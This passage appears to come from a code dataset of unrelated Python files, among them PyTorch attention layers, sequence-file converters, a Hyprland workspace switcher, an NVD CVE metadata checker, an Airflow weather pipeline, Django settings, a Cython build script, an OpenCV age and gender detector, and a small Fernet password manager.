= inplanes\n        self.ratio = ratio\n        self.planes = int(inplanes * ratio)\n        self.pooling_type = pooling_type\n        self.fusion_types = fusion_types\n        if pooling_type == 'att':\n            self.conv_mask = nn.Conv2d(inplanes, 1, kernel_size=1)\n            # self.conv_mask = nn.Conv2d(inplanes, 1, kernel_size=3, padding=1)  # \u4fee\u6539\u5904\n            self.softmax = nn.Softmax(dim=2)\n        else:\n            self.avg_pool = nn.AdaptiveAvgPool2d(1)\n        if 'channel_add' in fusion_types:\n            self.channel_add_conv = nn.Sequential(\n                nn.Conv2d(self.inplanes, self.planes, kernel_size=1),\n                nn.LayerNorm([self.planes, 1, 1]),\n                nn.ReLU(inplace=True),  # yapf: disable\n                nn.Conv2d(self.planes, self.inplanes, kernel_size=1))\n        else:\n            self.channel_add_conv = None\n        if 'channel_mul' in fusion_types:\n            self.channel_mul_conv = nn.Sequential(\n                nn.Conv2d(self.inplanes, self.planes, kernel_size=1),\n                nn.LayerNorm([self.planes, 1, 1]),\n                nn.ReLU(inplace=True),  # yapf: disable\n                nn.Conv2d(self.planes, self.inplanes, kernel_size=1))\n        else:\n            self.channel_mul_conv = None\n        self.reset_parameters()\n        self.avg = nn.AdaptiveAvgPool2d(1)\n\n    def reset_parameters(self):\n        if self.pooling_type == 'att':\n            kaiming_init(self.conv_mask, mode='fan_in')\n            self.conv_mask.inited = True\n\n        if self.channel_add_conv is not None:\n            last_zero_init(self.channel_add_conv)\n        if self.channel_mul_conv is not None:\n            last_zero_init(self.channel_mul_conv)\n\n    def spatial_pool(self, x):\n        batch, channel, height, width = x.size()\n        if self.pooling_type == 'att':\n            input_x = x\n            # [N, C, H * W]\n            input_x = input_x.view(batch, channel, height * width)\n            # [N, 1, C, H * W]\n            input_x = input_x.unsqueeze(1)\n            # [N, 1, H, W]\n            context_mask = self.conv_mask(x)\n            # [N, 1, H * W]\n            context_mask = context_mask.view(batch, 1, height * width)\n            # [N, 1, H * W]\n            context_mask = self.softmax(context_mask)\n            # [N, 1, H * W, 1]\n            context_mask = context_mask.unsqueeze(-1)\n            # [N, 1, C, 1]\n            context = torch.matmul(input_x, context_mask)\n            # [N, C, 1, 1]\n            context = context.view(batch, channel, 1, 1)\n        else:\n            # [N, C, 1, 1]\n            context = self.avg_pool(x)\n\n        return context\n\n    def forward(self, x):\n        # [N, C, 1, 1]\n        context = self.spatial_pool(x)\n\n        out = x\n        if self.channel_mul_conv is not None:\n            # [N, C, 1, 1]\n            channel_mul_term = torch.sigmoid(self.channel_mul_conv(context))\n            out = out * channel_mul_term\n\n        if self.channel_add_conv is not None:\n            # [N, C, 1, 1]\n            channel_add_term = self.channel_add_conv(context)\n            # out = out + channel_add_term\n            out = out + channel_add_term\n        return out\n\n\nclass Mix(nn.Module):\n    def __init__(self,m=-0.80):\n        super(Mix, self).__init__()\n        w=torch.nn.Parameter(torch.FloatTensor([m]),requires_grad=True)\n        w=torch.nn.Parameter(w,requires_grad=True)\n        self.w=w\n        self.mix_block=nn.Sigmoid()\n\n    def forward(self,fea1,fea2):\n        mix_factor=self.mix_block(self.w)\n        out=fea1*mix_factor.expand_as(fea1)+fea2*(1-mix_factor.expand_as(fea2))\n        return out\n\nclass Mix2(nn.Module):\n    def __init__(self,m=-0.80):\n        super(Mix2, self).__init__()\n        w=torch.nn.Parameter(torch.FloatTensor([m]),requires_grad=True)\n        w=torch.nn.Parameter(w,requires_grad=True)\n        self.w=w\n        self.mix_block=nn.ReLU()\n\n    def forward(self,x):\n        mix_factor=self.mix_block(self.w)\n    ",
    "\"\"\"\nCommonly-used utilities are here, not in a notebook, to\nmake them easier to test.\n\nTo run unit-tests: python3 -m doctest utilities.py\n(You may have to first 'pip3 install doctest'.)\n\"\"\"\n\nimport io\nfrom typing import BinaryIO, TextIO, List, Callable, Optional\nfrom pathlib import Path\nimport gzip\n\n\ndef gunzip_file(gzip_file_path: Path, suffix: str) -> Path:\n    assert gzip_file_path.suffix == suffix, gzip_file_path\n    result_path = gzip_file_path.with_suffix(\"\")\n    result = gunzip_fileobj(io.BytesIO(gzip_file_path.read_bytes()))\n    result_path.write_bytes(result.getvalue())\n    return result_path\n\n\ndef gunzip_fileobj(gzip_fileobj: BinaryIO) -> BinaryIO:\n    \"\"\"\n    >>> in_buf = io.BytesIO(b\"abcdef\")\n    >>> zipped_bytes = gzip.compress(b\"abcdef\")\n    >>> gunzip_fileobj(io.BytesIO(zipped_bytes)).getvalue()\n    b'abcdef'\n    \"\"\"\n    with gzip.open(gzip_fileobj, 'rb') as f_in:\n        return io.BytesIO(f_in.read())\n\n\ndef convert_directory(root_dir: Path,\n                      convertor: Callable[[Path], Path],\n                      suffix: str = \".fq\",\n                      delete_orig_file: bool = False) -> List[Path]:\n    result = []\n    for orig_file in root_dir.rglob(f\"*{suffix}\"):\n        new_file = convertor(orig_file)\n        print(f\"{str(orig_file)} -> {str(new_file)}\")\n        result.append(new_file)\n        if delete_orig_file:\n            orig_file.unlink()\n            print(f\"Deleted {str(orig_file)}\")\n    print(\"Done\")\n    return result\n\n\ndef gzip_file(file_path: Path) -> Path:\n    assert file_path.suffix != \".gz\", file_path\n    result_path = file_path.parent / f\"{file_path.name}.gz\"\n    # print(f\"Compressing {str(file_path)} to {str(result_path)}\")\n    result = gzip_fileobj(io.StringIO(file_path.read_text()))\n    result_path.write_bytes(result.getvalue())\n    return result_path\n\n\ndef gzip_fileobj(fileobj: TextIO) -> BinaryIO:\n    \"\"\"\n    >>> in_buf = io.StringIO(\"Hello world\")\n    >>> zipped = gzip_fileobj(in_buf)\n    >>> unzipped = gunzip_fileobj(zipped)\n    >>> unzipped.getvalue()\n    b'Hello world'\n    \"\"\"\n    buf = gzip.compress(fileobj.getvalue().encode(\"utf-8\"), compresslevel=2)\n    return io.BytesIO(buf)\n\n\ndef convert_fastq_to_fasta(fastq: Path) -> Path:\n    r\"\"\"\n    >>> fastq = Path(\"/tmp/test.fq\")\n    >>> _len = fastq.write_text(\"@seq1\\nacgt\\n@\\n####\\n@seq2\\ntgac\\n@\\n####\\n\")\n    >>> fasta = convert_fastq_to_fasta(fastq)\n    >>> print(fasta.read_text())\n    >seq1\n    acgt\n    >seq2\n    tgac\n    <BLANKLINE>\n    \"\"\"\n    fasta = fastq.with_suffix(\".fa\")\n    buf = convert_fastq_to_fasta_fileobj(io.StringIO(fastq.read_text()))\n    fasta.write_text(buf.getvalue())\n    return fasta\n\n\ndef convert_fastq_to_fasta_fileobj(fasta: TextIO) -> TextIO:\n    result = io.StringIO()\n    for i, line in enumerate(fasta):\n        line = line.strip()\n        if (i % 4) == 0 or ((i-1) % 4) == 0:\n           if line.startswith(\"@\"):\n               line = f\">{line[1:]}\"\n           result.write(line + \"\\n\")\n    return result\n\n\ndef convert_fasta_file_to_fastq(fasta: Path) -> Path:\n    fastq = fasta.with_suffix(\".fq\")\n    buf = convert_fasta_to_fastq_fileobj(io.StringIO(fasta.read_text()))\n    fastq.write_text(buf.getvalue() + \"\\n\")\n    return fastq\n\n\ndef convert_fasta_to_fastq_fileobj(fasta: TextIO) -> TextIO:\n    r\"\"\"\n\n    Main idea is to add in a fake quality line.\n\n    >>> fasta = \">seq1\\nacgt\\ngtac\"\n    >>> fastq = convert_fasta_to_fastq_fileobj(io.StringIO(fasta))\n    >>> print(fastq.getvalue())\n    @seq1\n    acgtgtac\n    +\n    ########\n\n    \"\"\"\n    result = io.StringIO()\n    summary: Optional[str] = None\n    sequence: List[str] = []\n\n    def output_fastq_entry():\n        nonlocal summary, sequence\n        result.write(f\"@{summary}\\n\")\n        seq_str = \"\".join(sequence)\n        result.write(f\"{seq_str}\\n\")\n        result.write(\"+\\n\")\n        result.write(\"#\" * len(seq_str))\n        summary = None\n        sequence = []\n\n    for line in fasta:\n        line = line.strip()\n        if line.startswith(\">\"):\n            if summary is not None:\n                output_fastq_entry()\n            summary = line[1:]\n            sequence = []\n        else:\n            sequence.append(line)\n    if summary is not None:\n        output_fastq_entry()\n    return result\n",
    "import sys\nimport getopt\nimport argparse\nimport time\nimport subprocess\nimport json\n\nYMAX = 5  # max y value to allow switching\nWORKSPACE_COUNT = 7  # the number of workspace in hyprland\nSLEEP = 0.01  # sleep time between measurments\n\ndef get_mouse():\n    str = subprocess.check_output([b'hyprctl', b'cursorpos']).split(b',')\n    return int(str[0]), int(str[1])\n\n\ndef get_workspace():\n    str = subprocess.check_output(['hyprctl', 'activeworkspace'])\n    return int(str[13:14])\n\ndef get_scaled_delta_width(scale: float) -> int:\n    monitors_json = subprocess.check_output([\"hyprctl\", \"monitors\", \"-j\"])\n    monitors = json.loads(monitors_json)\n    for monitor in monitors:\n        if monitor[\"focused\"]:\n            width = float(monitor[\"width\"])/float(monitor[\"scale\"])\n            return int(width*scale) # dynamic move distance\n\n    return int(1920*scale) # default scale \n\ndef set_workspace(pos: int):\n    if 0 < pos <= WORKSPACE_COUNT:  # limit the range of workspaces\n        subprocess.check_output(['hyprctl', 'dispatch', 'workspace', str(pos)])\n\ndef switch_workspace_hyprnome(right: True):\n    if (right):\n        subprocess.check_output(['hyprnome'])\n    else:\n        subprocess.check_output(['hyprnome', '-p'])\n\ndef main(argv):\n    # Configure different arguments to pass to the program\n    parser=argparse.ArgumentParser()\n    parser.add_argument(\"-s\", \"--scale\", type=float, default=0.20833333333333334, help=\"Range: [0.0, 1.0], float. Adjust what percentage of the current screen the mouse has to traverse to trigger a workspace switch\")\n    parser.add_argument(\"--hyprnome\", action=\"store_true\", help=\"Use hyprnome to switch workspaces (must be installed separately)\")\n    args=parser.parse_args()\n\n    MOVE_DISTANCE = get_scaled_delta_width(args.scale)\n\n    while True:\n        time.sleep(SLEEP * 4)\n        x, y = get_mouse()\n        \n        if y <= YMAX:\n            distance = 0  # reset distance from previous movements\n            previous_x = x  # over write the last x from previous unconected movements\n            while True:\n                time.sleep(SLEEP)\n                x, y = get_mouse()\n\n                if y > YMAX:  # quit if mouse leaves the allowed area\n                    break\n                    \n                if x != previous_x:\n                    distance += x - previous_x  # add the distance just traveled\n                    previous_x = x\n                    if distance >= MOVE_DISTANCE:  # check if distance traveled is enough\n                        distance = -MOVE_DISTANCE / 2\n                        if (args.hyprnome):  # check if using hyprnome\n                            switch_workspace_hyprnome(right=False)\n                        else:\n                            set_workspace(get_workspace() + 1)\n                    if distance <= -MOVE_DISTANCE:\n                        distance = +MOVE_DISTANCE / 2\n                        if (args.hyprnome):  # check if using hyprnome\n                            switch_workspace_hyprnome(right=True)\n                        else:\n                            set_workspace(get_workspace() - 1)\n\nif __name__ == '__main__':\n    main(sys.argv[1:])\n",
    "import json\nimport pandas as pd\nimport seaborn as sns\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport requests\nimport zipfile\nimport io\nfrom datetime import datetime, date, timedelta\nfrom termcolor import colored  # You may need to install this package\n\n# Function to download and extract the JSON file\ndef download_extract_json(url):\n    response = requests.get(url)\n    response.raise_for_status()\n    zipfile_bytes = io.BytesIO(response.content)\n    with zipfile.ZipFile(zipfile_bytes, 'r') as zip_ref:\n        json_file = zip_ref.namelist()[0]  # Assuming there is only one file in the zip\n        json_data = zip_ref.read(json_file)\n    return json.loads(json_data)\n\ndef create_dataframe(cve_items):\n    records = []\n    for item in cve_items:\n        cve_id = item['cve']['CVE_data_meta']['ID']\n        date = datetime.strptime(item['publishedDate'], \"%Y-%m-%dT%H:%MZ\").date()\n        has_references = bool(item['cve']['references']['reference_data'])\n        \n        has_cpes = False\n        for node in item.get('configurations', {}).get('nodes', []):\n            if 'cpe_match' in node:\n                has_cpes = True\n                break\n            for child in node.get('children', []):\n                if 'cpe_match' in child:\n                    has_cpes = True\n                    break\n            if has_cpes:\n                break\n\n        records.append((cve_id, date, not has_references, not has_cpes))\n    return pd.DataFrame(records, columns=['CVE_ID', 'Date', 'NoReferences', 'NoCPEs'])\n\n# URL to the NVD JSON zip file\nurl = 'https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2024.json.zip'\n\n# Download and extract JSON data\ndata = download_extract_json(url)\n\n# Create DataFrame\ndf = create_dataframe(data['CVE_Items'])\n\n# Filter new CVEs for today\ntoday = date.today()- timedelta(days=1)\ndf_today = df[df['Date'] == today]\n\n# Create a new DataFrame for display purposes\ndf_display = df_today[['CVE_ID', 'NoCPEs', 'NoReferences']].copy()\n\n# Convert boolean to PASS/FAIL for display\ndf_display['CPE Status'] = df_display['NoCPEs'].apply(lambda x: 'FAIL' if x else 'PASS')\ndf_display['Reference Status'] = df_display['NoReferences'].apply(lambda x: 'FAIL' if x else 'PASS')\n\n# Drop the original boolean columns\ndf_display.drop(['NoCPEs', 'NoReferences'], axis=1, inplace=True)\n\n# Function to print the DataFrame in terminal with color\ndef print_colored_table(df):\n    # Determine column widths\n    cve_id_width = max(df['CVE_ID'].apply(len).max(), len('CVE ID')) + 2\n    status_width = max(len('CPE Status'), len('Reference Status')) + 2\n\n    # Print the header\n    print(f\"Analyzing CVES for {today}\")\n    print(f\"{'CVE ID'.ljust(cve_id_width)}{'CPE'.ljust(8)}{'References'.ljust(status_width)}\")\n\n    # Print each row\n    for index, row in df.iterrows():\n        cve_id = row['CVE_ID'].ljust(cve_id_width)\n        \n        # Determine CPE and Reference status\n        cpe_status_text = 'PASS' if not row['NoCPEs'] else 'FAIL'\n        ref_status_text = 'PASS' if not row['NoReferences'] else 'FAIL'\n\n        # Apply color to the statuses\n        cpe_status = colored(cpe_status_text, 'green' if cpe_status_text == 'PASS' else 'red').ljust(status_width)\n        ref_status = colored(ref_status_text, 'green' if ref_status_text == 'PASS' else 'red').ljust(status_width)\n\n        # Print the row\n        print(f\"{cve_id}{cpe_status}{ref_status.ljust(status_width)}\")\n\nif 'NoCPEs' in df_today.columns and 'NoReferences' in df_today.columns:\n    print_colored_table(df_today)\nelse:\n    print(\"The DataFrame does not have the required 'NoCPEs' or 'NoReferences' columns.\")\n\n",
    "\nfrom airflow import DAG\nfrom airflow.models import Variable\nfrom airflow.operators.python import PythonOperator\nfrom airflow.providers.google.cloud.transfers.gcs_to_bigquery import GCSToBigQueryOperator\nfrom airflow.providers.google.cloud.operators.bigquery import BigQueryInsertJobOperator, BigQueryCreateEmptyTableOperator\nfrom airflow.providers.google.cloud.hooks.bigquery import BigQueryHook\nfrom airflow.utils.dates import days_ago\nfrom datetime import datetime, timedelta, timezone\nimport requests\nimport os\nimport pandas as pd\nfrom google.cloud import storage\nfrom airflow.providers.google.cloud.hooks.gcs import GCSHook\n\n\n\nAPI_KEY = Variable.get(\"weather-api-key\")\nGCS_BUCKET = Variable.get(\"gcs-bucket\")\nPROJECT_ID = Variable.get(\"bq_data_warehouse_project\")\n\nBQ_DATASET = \"weather\"\nBQ_STAGING_DATASET = f\"stg_{BQ_DATASET}\"\nTABLE_NAME = 'daily_data'\nSQL_PATH = f\"{os.path.abspath(os.path.dirname(__file__))}/sql/\"\nLAT = 40.7128  # Example: New York City latitude\nLON = -74.0060  # Example: New York City longitude\n\n\n\n\ndefault_args = {\n    'owner': 'airflow',\n    'depends_on_past': False,\n    'start_date': days_ago(1),\n    'email_on_failure': False,\n    'email_on_retry': False,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=5),\n    'backfill_date': datetime.strptime('2024-03-02', '%Y-%m-%d').date()\n}\n\ndef date_to_unix_timestamp(date):\n\n    if date is None:\n    # Get the current date\n        date = datetime.now().date()\n\n    # Convert to a datetime object with time set to midnight\n    date_converted = datetime.combine(date, datetime.min.time())\n    \n    # Convert to Unix timestamp (UTC time zone)\n    unix_timestamp = int(date_converted.replace(tzinfo=timezone.utc).timestamp())\n    \n    return unix_timestamp, date\n\n\ndef fetch_weather_data(**context):\n    backfill_date = default_args['backfill_date']\n    unix_timestamp, date = date_to_unix_timestamp(backfill_date)\n    url = f\"https://api.openweathermap.org/data/3.0/onecall/timemachine?lat={LAT}&lon={LON}&dt={unix_timestamp}&appid={API_KEY}\"\n\n    # Make the request\n    response = requests.get(url)\n    data = response.json()[\"data\"]\n    df = pd.DataFrame(data)\n\n    # Create an extra column, datetime non-unix timestamp format\n    df['datetime'] = date\n\n    # Save DataFrame to Parquet\n    filename = f\"weather_data_{date}.parquet\"\n    \"\"\"\n    Push the filename into Xcom - XCom (short for cross-communication) is a \n    mechanism that allows tasks to exchange messages or small amounts of data.\n    Variable have a function scope, but we need to use it in the next task\n    \"\"\"\n    context['ti'].xcom_push(key='filename', value=filename)\n\n    # Upload the file\n    gcs_hook = GCSHook() # it's using default GCP conection 'google_cloud_default'\n    gcs_hook.upload(bucket_name=GCS_BUCKET, object_name=filename, data=df.to_parquet(index=False))\n\n\n\n\ndag = DAG(\n    'weather_data_ingestion',\n    default_args=default_args,\n    description='Fetch weather data and store in BigQuery',\n    schedule_interval='@daily',\n)\n\nfetch_weather_data_task = PythonOperator(\n    task_id='fetch_weather_data',\n    python_callable=fetch_weather_data,\n    dag=dag,\n)\n\n\ngcs_to_bq_staging_task = GCSToBigQueryOperator(\n    task_id=\"gcs_to_bigquery\",\n    bucket=GCS_BUCKET,\n    source_objects=[\"{{ti.xcom_pull(key='filename')}}\"], # pull filename from Xcom from the previous task\n    destination_project_dataset_table=f'{PROJECT_ID}.{BQ_STAGING_DATASET}.stg_{TABLE_NAME}',\n    create_disposition='CREATE_IF_NEEDED', # automatically creates table for us\n    write_disposition='WRITE_TRUNCATE', # automatically drops previously stored data in the table\n    time_partitioning={'type': 'DAY', 'field': 'datetime'}, # remember partitioning in the beginning? here it comes!\n    gcp_conn_id=\"google_cloud_default\",\n    source_format='PARQUET',\n    dag=dag,\n)\n\n\ncreate_table_with_schema = BigQueryCreateEmptyTableOperator(\n    task_id='create_table_with_schema',\n    project_id=PROJECT_ID,\n    dataset_id=BQ_DATASET,\n    table_id=TABLE_NAME,\n    time_partitioning={'type': 'DAY', 'field': 'datetime'},\n    schema_fields=[\n        {\"name\": \"dt\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"sunrise\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"sunset\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"temp\", \"type\": \"FLOAT\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"feels_like\", \"type\": \"FLOAT\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"pressure\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"humidity\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"dew_point\", \"type\": \"FLOAT\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"clouds\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"visibility\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"wind_speed\", \"type\": \"FLOAT\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"wind_deg\", \"type\": \"INTEGER\", \"mode\": \"NULLABLE\"},\n        {\"name\": \"weather\", \"type\": \"RECORD\", \"mode\": \"NULLABLE\", \"fields\": [\n            {\"name\": \"list\", \"type\": ",
    "\"\"\"\nDjango settings for core project.\n\nGenerated by 'django-admin startproject' using Django 5.0.3.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = \"django-insecure-q1d_aq=12sqn0ue5nptu7=1g8xl@*uci2o%e@07l1+)l^3(i7n\"\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    \"django.contrib.admin\",\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"user\",\n    \"book\",\n    \"borrowing\",\n    \"payment\",\n]\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n]\n\nROOT_URLCONF = \"core.urls\"\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"core.wsgi.application\"\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.sqlite3\",\n        \"NAME\": BASE_DIR / \"db.sqlite3\",\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.UserAttributeSimilarityValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.MinimumLengthValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.CommonPasswordValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.NumericPasswordValidator\",\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = \"en-us\"\n\nTIME_ZONE = \"UTC\"\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = \"static/\"\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\n",
    "import os, pathlib, shutil\nimport sys, platform\nfrom setuptools import Extension, setup\n\nSOURCE_DIR = \"path/to/folder\"\nsource_files = []\n\nfor root, dirs, files in os.walk(SOURCE_DIR):\n    for file in files:\n        if (not file.endswith((\".py\", \".pyx\"))) or file.startswith(\"__init__\"):\n            continue\n        name = file[: file.rindex(\".\")]\n        source_files.append((name, os.path.join(root, file)))\n\nsys.argv[1:] = [\"build_ext\", \"--inplace\"]\next_modules = [Extension(name, [source]) for name, source in source_files]\nsetup(ext_modules=ext_modules)\n\nbase_dir = os.path.dirname(os.path.abspath(sys.argv[0]))\nbuild_dir = os.path.join(base_dir, \"build\")\nshutil.rmtree(build_dir, ignore_errors=True)\n\nextension = \".pyd\" if platform.system().lower() == \"windows\" else \".so\"\ndynamic_libraries = [\n    file\n    for file in os.listdir(base_dir)\n    if (os.path.isfile(file) and file.endswith(extension))\n]\n\nfor name, source in source_files:\n    c_file = source[: source.rindex(\".\")] + \".c\"\n    pathlib.Path(c_file).unlink(missing_ok=True)\n\n    for library in dynamic_libraries:\n        if not library.startswith(name):\n            continue\n        move_from = os.path.join(base_dir, library)\n        move_to = os.path.join(os.path.dirname(source), library)\n        pathlib.Path(move_to).unlink(missing_ok=True)\n        shutil.move(move_from, move_to)\n        break\n",
    "import cv2\r\n\r\n\r\ndef getFaceBox(faceNet, frame):\r\n    frameHeight = frame.shape[0]\r\n    frameWidth = frame.shape[1]\r\n    blob = cv2.dnn.blobFromImage(frame, 1.0, (227, 227), [104, 117, 123], swapRB=False)\r\n    faceNet.setInput(blob)\r\n    detection = faceNet.forward()\r\n    faceBoxes = []\r\n    for i in range(detection.shape[2]):\r\n        confidence = detection[0, 0, i, 2]\r\n        if confidence > 0.7:\r\n            x1 = int(detection[0, 0, i, 3] * frameWidth)\r\n            y1 = int(detection[0, 0, i, 4] * frameHeight)\r\n            x2 = int(detection[0, 0, i, 5] * frameWidth)\r\n            y2 = int(detection[0, 0, i, 6] * frameHeight)\r\n            faceBoxes.append([x1, y1, x2, y2])\r\n            cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 1)\r\n    return frame, faceBoxes\r\n\r\n\r\nfaceProto = \"opencv_face_detector.pbtxt\"\r\nfaceModel = \"opencv_face_detector_uint8.pb\"\r\n\r\nageProto = \"age_deploy.prototxt\"\r\nageModel = \"age_net.caffemodel\"\r\n\r\ngenderProto = \"gender_deploy.prototxt\"\r\ngenderModel = \"gender_net.caffemodel\"\r\n\r\nfaceNet = cv2.dnn.readNet(faceModel, faceProto)\r\nageNet = cv2.dnn.readNet(ageModel, ageProto)\r\ngenderNet = cv2.dnn.readNet(genderModel, genderProto)\r\n\r\nMODEL_MEAN_VALUES = (78.4263377603, 87.7689143744, 114.895847746)\r\nageList = ['(0-2)', '(4-6)', '(8-12)', '(15-20)', '(25-32)', '(38-43)', '(48-53)', '(60-100)']\r\ngenderList = ['Male', 'Female']\r\n\r\nvideo = cv2.VideoCapture(0)\r\n\r\npadding = 20\r\n\r\nwhile True:\r\n    hasFrame, vidFrame = video.read()\r\n\r\n    if not hasFrame:\r\n        cv2.waitKey()\r\n        break\r\n\r\n    frame, faceBoxes = getFaceBox(faceNet, vidFrame)\r\n\r\n    if not faceBoxes:\r\n        print(\"No face detected\")\r\n\r\n    for faceBox in faceBoxes:\r\n        face = frame[max(0, faceBox[1] - padding):min(faceBox[3] + padding, frame.shape[0] - 1),\r\n               max(0, faceBox[0] - padding):min(faceBox[2] + padding, frame.shape[1] - 1)]\r\n\r\n        blob = cv2.dnn.blobFromImage(face, 1.0, (227, 227), MODEL_MEAN_VALUES, swapRB=False)\r\n\r\n        genderNet.setInput(blob)\r\n        genderPred = genderNet.forward()\r\n        gender = genderList[genderPred[0].argmax()]\r\n\r\n        ageNet.setInput(blob)\r\n        agePred = ageNet.forward()\r\n        age = ageList[agePred[0].argmax()]\r\n\r\n        labelGender = \"{}\".format(\"Gender : \" + gender)\r\n        labelAge = \"{}\".format(\"Age : \" + age + \"Years\")\r\n        cv2.putText(frame, labelGender, (faceBox[0], faceBox[1] - 40), cv2.FONT_HERSHEY_SIMPLEX, 0.8,\r\n                    (0, 255, 255), 2, cv2.LINE_AA)\r\n        cv2.putText(frame, labelAge, (faceBox[0], faceBox[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.8,\r\n                    (0, 255, 255), 2, cv2.LINE_AA)\r\n    cv2.imshow(\"Age-Gender Detector\", frame)\r\n    if cv2.waitKey(1) == ord('q'):\r\n        break\r\n\r\nvideo.release()\r\ncv2.destroyAllWindows()\r\n",
    "import cryptography.fernet\r\nfrom cryptography.fernet import Fernet\r\nfrom tkinter.messagebox import *\r\n\r\n\r\nclass passwordManager:\r\n\r\n    def __init__(self):\r\n        self.key = None\r\n        self.pwd_file = None\r\n        self.pwd_dict: dict = {}\r\n        self.array_checker: set = set()\r\n        self.checkKeyValidility: bool = True\r\n\r\n    def create_key(self, path):\r\n        try:\r\n            self.key = Fernet.generate_key()\r\n            with open(path, 'wb') as f:\r\n                f.write(self.key)\r\n        except FileNotFoundError:\r\n            pass\r\n\r\n    def load_key(self, path):\r\n        try:\r\n            with open(path, 'rb') as f:\r\n                self.key = f.read()\r\n        except FileNotFoundError:\r\n            pass\r\n\r\n    def create_passwordFile(self, path, initial_values: dict = None):\r\n        self.pwd_file = path\r\n        with open(self.pwd_file, 'w'):\r\n            pass\r\n\r\n        if initial_values is not None:\r\n            for primeKey, subKey in initial_values.items():\r\n                for key, value in subKey.items():\r\n                    self.add_password(primeKey, key, value)\r\n\r\n    def load_passwordFile(self, path):\r\n        self.pwd_file = path\r\n        self.pwd_dict = {}\r\n\r\n        try:\r\n            with open(path, 'r') as f:\r\n                for line in f:\r\n                    try:\r\n                        site, email, encrypted_pwd = line.split(':')\r\n                        decryptedPass = Fernet(self.key).decrypt(encrypted_pwd.encode()).decode()\r\n                        self.pwd_dict[site] = {email: decryptedPass}\r\n                        self.array_checker = site, email, decryptedPass\r\n                    except ValueError:\r\n                        pass\r\n                # prints the decrypted dictionary, needed to be removed when done!!!\r\n                self.checkKeyValidility = True\r\n                print(self.pwd_dict)\r\n                print(self.array_checker)\r\n        except FileNotFoundError:\r\n            pass\r\n        except TypeError:\r\n            showerror('Error', '!!!the key is required first!!!')\r\n        except cryptography.fernet.InvalidToken:\r\n            self.checkKeyValidility = False\r\n            showerror('Error', '!!!Invalid key!!!')\r\n\r\n    def add_password(self, site, email, password):\r\n        self.pwd_dict[site] = {email: password}\r\n        # self.array_checker = site, email, password\r\n\r\n        if self.pwd_file is not None:\r\n            with open(self.pwd_file, 'a+') as f:\r\n                if (site not in self.array_checker) or \\\r\n                        (email not in self.array_checker) or (password not in self.array_checker):\r\n                    encrypted = Fernet(self.key).encrypt(password.encode())\r\n                    f.write(site + ':' + email + ':' + encrypted.decode() + '\\n')\r\n\r\n        # to check there's no repetitive same line when pressing submit button multiple times\r\n        # recalling the function \"load_passwordFile\" from a class \"passwordManager\"\r\n        passwordManager.load_passwordFile(self, self.pwd_file)\r\n\r\n    def get_password(self, site) -> list:\r\n        for primeKey, subKey in self.pwd_dict.items():\r\n            for key, value in subKey.items():\r\n                if primeKey == site:\r\n                    return [site, key, value]\r\n\r\n    